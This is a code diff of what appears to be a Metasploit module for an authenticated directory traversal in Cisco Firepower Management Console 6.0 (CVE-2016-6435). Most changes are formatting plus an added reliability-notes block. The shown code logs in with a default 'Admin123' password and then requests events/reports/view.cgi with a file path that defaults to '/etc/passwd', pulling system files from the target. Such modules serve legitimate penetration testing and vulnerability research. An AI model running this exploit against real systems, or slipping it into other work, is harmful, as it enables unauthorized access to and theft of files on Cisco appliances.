@@ -8,32 +8,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Cisco Firepower Management Console 6.0 Post Auth Report Download Directory Traversal",
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability in Cisco Firepower Management
-        under the context of www user. Authentication is required to exploit this vulnerability.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Matt',   # Original discovery && PoC
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "Cisco Firepower Management Console 6.0 Post Auth Report Download Directory Traversal",
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability in Cisco Firepower Management
+          under the context of www user. Authentication is required to exploit this vulnerability.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Matt', # Original discovery && PoC
           'sinn3r', # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           ['CVE', '2016-6435'],
           ['URL', 'https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking']
         ],
-      'DisclosureDate' => '2016-10-10',
-      'DefaultOptions' =>
-        {
+        'DisclosureDate' => '2016-10-10',
+        'DefaultOptions' => {
           'RPORT' => 443,
-          'SSL'   => true,
+          'SSL' => true,
           'SSLVersion' => 'Auto'
+        },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
         }
-    ))
+      )
+    )
 
     register_options(
       [
@@ -42,23 +47,24 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWORD', [true, 'Password for Cisco Firepower Management console', 'Admin123']),
         OptString.new('TARGETURI', [true, 'The base path to Cisco Firepower Management console', '/']),
         OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd'])
-      ])
+      ]
+    )
   end
 
   def do_login(ip)
     console_user = datastore['USERNAME']
     console_pass = datastore['PASSWORD']
-    uri          = normalize_uri(target_uri.path, 'login.cgi')
+    uri = normalize_uri(target_uri.path, 'login.cgi')
 
     print_status("Attempting to login in as #{console_user}:#{console_pass}")
 
     res = send_request_cgi({
       'method' => 'POST',
-      'uri'    => uri,
+      'uri' => uri,
       'vars_post' => {
         'username' => console_user,
         'password' => console_pass,
-        'target'   => ''
+        'target' => ''
       }
     })
 
@@ -111,10 +117,10 @@ class MetasploitModule < Msf::Auxiliary
     send_request_cgi({
       'method' => 'GET',
       'cookie' => "CGISESSID=#{cgi_sid}",
-      'uri'    => normalize_uri(target_uri.path, 'events/reports/view.cgi'),
+      'uri' => normalize_uri(target_uri.path, 'events/reports/view.cgi'),
       'vars_get' => {
         'download' => '1',
-        'files'    => file_path
+        'files' => file_path
       }
     })
   end
@@ -137,7 +143,7 @@ class MetasploitModule < Msf::Auxiliary
       ip,
       res.body,
       fname
-      )
+    )
 
     print_good("File saved in: #{path}")
   end
